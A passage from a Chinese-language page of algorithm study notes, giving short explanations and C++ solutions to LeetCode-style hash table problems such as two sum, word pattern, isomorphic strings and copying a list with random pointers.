class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="设计哈希映射">设计哈希映射</h2><blockquote><p>「设计哈希映射」与「设计哈希集合」解法接近，唯一的区别在于我们存储的不是key 本身，而是 (key,value) 对。除此之外，代码基本是类似的。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHashMap</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    vector&lt;list&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;&gt; data;<br>    <span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">int</span> base = <span class="hljs-number">769</span>;<br>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123; <span class="hljs-keyword">return</span> key % base; &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">MyHashMap</span>() : <span class="hljs-built_in">data</span>(base) &#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-type">int</span> key, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>        <span class="hljs-type">int</span> h = <span class="hljs-built_in">hash</span>(key);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = data[h].<span class="hljs-built_in">begin</span>(); it != data[h].<span class="hljs-built_in">end</span>(); it++) &#123;<br>            <span class="hljs-keyword">if</span> ((*it).first == key) &#123;<br>                (*it).second = value;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>        data[h].<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">make_pair</span>(key, value));<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> h = <span class="hljs-built_in">hash</span>(key);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = data[h].<span class="hljs-built_in">begin</span>(); it != data[h].<span class="hljs-built_in">end</span>(); it++) &#123;<br>            <span class="hljs-keyword">if</span> ((*it).first == key) &#123;<br>                <span class="hljs-keyword">return</span> (*it).second;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> h = <span class="hljs-built_in">hash</span>(key);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = data[h].<span class="hljs-built_in">begin</span>(); it != data[h].<span class="hljs-built_in">end</span>(); it++) &#123;<br>            <span class="hljs-keyword">if</span> ((*it).first == key) &#123;<br>                data[h].<span class="hljs-built_in">erase</span>(it);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="存在重复元素">存在重复元素</h2><blockquote><p>对于数组中每个元素，我们将它插入到哈希表中。如果插入一个元素时发现该元素已经存在于哈希表中，则说明存在重复的元素。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">containsDuplicate</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        unordered_set&lt;<span class="hljs-type">int</span>&gt; set;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>            <span class="hljs-keyword">if</span> (set.<span class="hljs-built_in">find</span>(num) != set.<span class="hljs-built_in">end</span>()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            set.<span class="hljs-built_in">insert</span>(num);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="两个数组的交集">两个数组的交集</h2><blockquote><p>遍历数组 <code>nums1</code>，对于其中的每个元素，遍历数组<code>nums2</code> 判断该元素是否在数组 <code>nums2</code>中。使用了哈希表降低时间复杂度，以空间换时间。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">intersection</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums1, vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums2)</span> </span>&#123;<br>        unordered_set&lt;<span class="hljs-type">int</span>&gt; set1, set2;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums1) &#123;<br>            set1.<span class="hljs-built_in">insert</span>(num);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums2) &#123;<br>            set2.<span class="hljs-built_in">insert</span>(num);<br>        &#125;<br>        <span class="hljs-keyword">return</span> (set1.<span class="hljs-built_in">size</span>() &gt; set2.<span class="hljs-built_in">size</span>()) ? <span class="hljs-built_in">getIntersection</span>(set2, set1)<br>                                           : <span class="hljs-built_in">getIntersection</span>(set1, set2);<br>    &#125;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">getIntersection</span><span class="hljs-params">(unordered_set&lt;<span class="hljs-type">int</span>&gt;&amp; set1,</span></span><br><span class="hljs-params"><span class="hljs-function">                                unordered_set&lt;<span class="hljs-type">int</span>&gt;&amp; set2)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; intersection;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : set1) &#123;<br>            <span class="hljs-keyword">if</span> (set2.<span class="hljs-built_in">count</span>(num)) &#123;<br>                intersection.<span class="hljs-built_in">push_back</span>(num);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> intersection;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最长连续序列">最长连续序列</h2><blockquote><p>我们考虑枚举数组中的每个数 x，考虑以其为起点，不断尝试匹配 x+1,x+2,⋯是否存在，假设最长匹配到了 x+y，那么以 x 为起点的最长连续序列即为x,x+1,x+2,⋯,x+y，其长度为y+1，我们不断枚举并更新答案即可。分析这个过程，我们会发现其中执行了很多不必要的枚举，如果已知有一个x,x+1,x+2,⋯,x+y 的连续序列，而我们却重新从 x+1，x+2 或者是 x+y处开始尝试匹配，那么得到的结果肯定不会优于枚举 x为起点的答案，因此我们在外层循环的时候碰到这种情况跳过即可。那么怎么判断是否跳过呢？由于我们要枚举的数x 一定是在数组中不存在前驱数 x−1 的，不然按照上面的分析我们会从 x−1开始尝试匹配，因此我们每次在哈希表中检查是否存在 x−1即能判断是否需要跳过了。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">longestConsecutive</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        unordered_set&lt;<span class="hljs-type">int</span>&gt; set;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>            set.<span class="hljs-built_in">insert</span>(num);<br>        &#125;<br><br>        <span class="hljs-type">int</span> longestSteak = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : set) &#123;<br>            <span class="hljs-keyword">if</span> (!set.<span class="hljs-built_in">count</span>(num - <span class="hljs-number">1</span>)) &#123;<br>                <span class="hljs-type">int</span> currentNum = num;<br>                <span class="hljs-type">int</span> currentSteak = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">while</span> (set.<span class="hljs-built_in">count</span>(currentNum + <span class="hljs-number">1</span>)) &#123;<br>                    currentNum++;<br>                    currentSteak++;<br>                &#125;<br>                longestSteak = <span class="hljs-built_in">max</span>(longestSteak, currentSteak);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> longestSteak;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="单词规律">单词规律</h2><blockquote><p>判断字符与字符串之间是否恰好一一对应。即任意一个字符都对应着唯一的字符串，任意一个字符串也只被唯一的一个字符对应。在集合论中，这种关系被称为「双射」。可以利用哈希表记录每一个字符对应的字符串，以及每一个字符串对应的字符。然后我们枚举每一对字符与字符串的配对过程，不断更新哈希表，如果发生了冲突，则说明给定的输入不满足双射关系。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">wordPattern</span><span class="hljs-params">(string pattern, string s)</span> </span>&#123;<br>        unordered_map&lt;string, <span class="hljs-type">char</span>&gt; str2ch;<br>        unordered_map&lt;<span class="hljs-type">char</span>, string&gt; ch2str;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : pattern) &#123;<br>            <span class="hljs-keyword">if</span> (i &gt;= n) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-type">int</span> j = i;<br>            <span class="hljs-keyword">while</span> (j &lt; n &amp;&amp; s[j] != <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>                j++;<br>            &#125;<br>            string temp = s.<span class="hljs-built_in">substr</span>(i, j - i);<br>            <span class="hljs-keyword">if</span> (str2ch.<span class="hljs-built_in">count</span>(temp) &amp;&amp; str2ch[temp] != ch) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (ch2str.<span class="hljs-built_in">count</span>(ch) &amp;&amp; ch2str[ch] != temp) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            str2ch[temp] = ch;<br>            ch2str[ch] = temp;<br>            i = j + <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> i &gt;= n;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="数组中的-k-diff-数对">数组中的 k-diff 数对</h2><blockquote><p>由于 <em>k</em>是定值，知道数对的较小值，也就知道了另一个值，因此我们可以只将数对的较小值放入<em>res</em>，而不影响结果的正确性。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findPairs</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        unordered_set&lt;<span class="hljs-type">int</span>&gt; set;<br>        unordered_set&lt;<span class="hljs-type">int</span>&gt; res;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>            <span class="hljs-keyword">if</span> (set.<span class="hljs-built_in">count</span>(num - k)) &#123;<br>                res.<span class="hljs-built_in">insert</span>(num - k);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (set.<span class="hljs-built_in">count</span>(num + k)) &#123;<br>                res.<span class="hljs-built_in">insert</span>(num);<br>            &#125;<br>            set.<span class="hljs-built_in">insert</span>(num);<br>        &#125;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-built_in">size</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="同构字符串">同构字符串</h2><blockquote><p>此题是「单词规律」的简化版，需要我们判断 s 和 t每个位置上的字符是否都一一对应，即 s 的任意一个字符被 t中唯一的字符对应，同时 t 的任意一个字符被 s中唯一的字符对应。这也被称为「双射」的关系。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isIsomorphic</span><span class="hljs-params">(string s, string t)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">char</span>, <span class="hljs-type">char</span>&gt; s2t;<br>        unordered_map&lt;<span class="hljs-type">char</span>, <span class="hljs-type">char</span>&gt; t2s;<br>        <span class="hljs-type">int</span> len = s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>            <span class="hljs-type">char</span> x = s[i];<br>            <span class="hljs-type">char</span> y = t[i];<br>            <span class="hljs-keyword">if</span> ((s2t.<span class="hljs-built_in">count</span>(x) &amp;&amp; s2t[x] != y) ||<br>                (t2s.<span class="hljs-built_in">count</span>(y) &amp;&amp; t2s[y] != x)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            s2t[x] = y;<br>            t2s[y] = x;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="随机链表的复制">随机链表的复制</h2><blockquote><p>如果是普通链表，我们可以直接按照遍历的顺序创建链表节点。而本题中因为随机指针的存在，当我们拷贝节点时，「当前节点的随机指针指向的节点」可能还没创建，因此我们需要变换思路。一个可行方案是，我们利用回溯的方式，让每个节点的拷贝操作相互独立。对于当前节点，我们首先要进行拷贝，然后我们进行「当前节点的后继节点」和「当前节点的随机指针指向的节点」拷贝，拷贝完成后将创建的新节点的指针返回，即可完成当前节点的两指针的赋值。</p><p>具体地，我们用哈希表记录每一个节点对应新节点的创建情况。遍历该链表的过程中，我们检查「当前节点的后继节点」和「当前节点的随机指针指向的节点」的创建情况。如果这两个节点中的任何一个节点的新节点没有被创建，我们都立刻递归地进行创建。当我们拷贝完成，回溯到当前层时，我们即可完成当前节点的指针赋值。注意一个节点可能被多个其他节点指向，因此我们可能递归地多次尝试拷贝某个节点，为了防止重复拷贝，我们需要首先检查当前节点是否被拷贝过，如果已经拷贝过，我们可以直接从哈希表中取出拷贝后的节点的指针并返回即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    unordered_map&lt;Node*, Node*&gt; cachedNode;<br>    <span class="hljs-function">Node* <span class="hljs-title">copyRandomList</span><span class="hljs-params">(Node* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!cachedNode.<span class="hljs-built_in">count</span>(head)) &#123;<br>            Node* headNew = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Node</span>(head-&gt;val);<br>            cachedNode[head] = headNew;<br>            headNew-&gt;next = <span class="hljs-built_in">copyRandomList</span>(head-&gt;next);<br>            headNew-&gt;random = <span class="hljs-built_in">copyRandomList</span>(head-&gt;random);<br>        &#125;<br>        <span class="hljs-keyword">return</span> cachedNode[head];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="哈希表与索引">2. 哈希表与索引</h1><h2 id="两数之和">两数之和</h2><blockquote><p>创建一个哈希表，对于每一个<code>x</code>，我们首先查询哈希表中是否存在<code>target - x</code>，然后将 <code>x</code>插入到哈希表中，即可保证不会让 <code>x</code> 和自己匹配。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; hashtable;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">auto</span> it = hashtable.<span class="hljs-built_in">find</span>(target - nums[i]);<br>            <span class="hljs-keyword">if</span> (it != hashtable.<span class="hljs-built_in">end</span>()) &#123;<br>                <span class="hljs-keyword">return</span> &#123;it-&gt;second, i&#125;;<br>            &#125;<br>            hashtable[nums[i]] = i;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="两个列表的最小索引总和">两个列表的最小索引总和</h2><blockquote><p>使用一个哈希表记录 list 1中每个餐厅对应的索引下标，然后遍历 list 2，如果 list2中的餐厅存在于哈希表中，那么说明该餐厅是两人共同喜爱的，计算它的索引和。如果该索引和比最小索引和小，则清空结果，将该餐厅加入结果中，该索引和作为最小索引和；如果该索引和等于最小索引和，则直接将该餐厅加入结果中。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">findRestaurant</span><span class="hljs-params">(vector&lt;string&gt;&amp; list1, vector&lt;string&gt;&amp; list2)</span> </span>&#123;<br>        unordered_map&lt;string, <span class="hljs-type">int</span>&gt; index;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list1.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            index[list1[i]] = i;<br>        &#125;<br><br>        vector&lt;string&gt; ret;<br>        <span class="hljs-type">int</span> indexSum = INT_MAX;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list2.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (index.<span class="hljs-built_in">count</span>(list2[i]) &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">int</span> j = index[list2[i]];<br>                <span class="hljs-keyword">if</span> (i + j &lt; indexSum) &#123;<br>                    ret.<span class="hljs-built_in">clear</span>();<br>                    ret.<span class="hljs-built_in">push_back</span>(list2[i]);<br>                    indexSum = i + j;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i + j == indexSum) &#123;<br>                    ret.<span class="hljs-built_in">push_back</span>(list2[i]);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="存在重复元素ii">存在重复元素II</h2><blockquote><p>从左到右遍历数组 nums，当遍历到下标 i 时，如果存在下标 j&lt;i 使得nums[i]=nums[j]，则当 i−j≤k 时即找到了两个符合要求的下标 j 和i。如果在下标 i 之前存在多个元素都和 nums[i] 相等，为了判断是否存在满足nums[i]=nums[j] 且 i−j≤k 的下标j，应该在这些元素中寻找下标最大的元素，将最大下标记为 j，判断 i−j≤k是否成立。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br>public:<br>    <span class="hljs-type">bool</span> <span class="hljs-title function_">containsNearbyDuplicate</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> &#123;<br>        <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; mp;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.size(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (mp.count(nums[i]) &amp;&amp; (i - mp[nums[i]]) &lt;= k) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            mp[nums[i]] = i;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="哈希表与统计">3. 哈希表与统计</h1><h2 id="最长和谐子序列">最长和谐子序列</h2><blockquote><p>我们首先遍历一遍数组，得到哈希映射。随后遍历哈希映射，设当前遍历到的键值对为(x,value)，那么我们就查询 x+1 在哈希映射中对应的统计次数，就得到了 x 和x+1 出现的次数，和谐子序列的长度等于 x 和 x+1 出现的次数之和。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findLHS</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; cnt;<br>        <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>            cnt[num]++;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> [key, val] : cnt) &#123;<br>            <span class="hljs-keyword">if</span> (cnt.<span class="hljs-built_in">count</span>(key + <span class="hljs-number">1</span>)) &#123;<br>                res = <span class="hljs-built_in">max</span>(res, val + cnt[key + <span class="hljs-number">1</span>]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="两个数组的交集ii">两个数组的交集II</h2><blockquote><p>由于同一个数字在两个数组中都可能出现多次，因此需要用哈希表存储每个数字出现的次数。对于一个数字，其在交集中出现的次数等于该数字在两个数组中出现次数的最小值。首先遍历第一个数组，并在哈希表中记录第一个数组中的每个数字以及对应出现的次数，然后遍历第二个数组，对于第二个数组中的每个数字，如果在哈希表中存在这个数字，则将该数字添加到答案，并减少哈希表中该数字出现的次数。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span 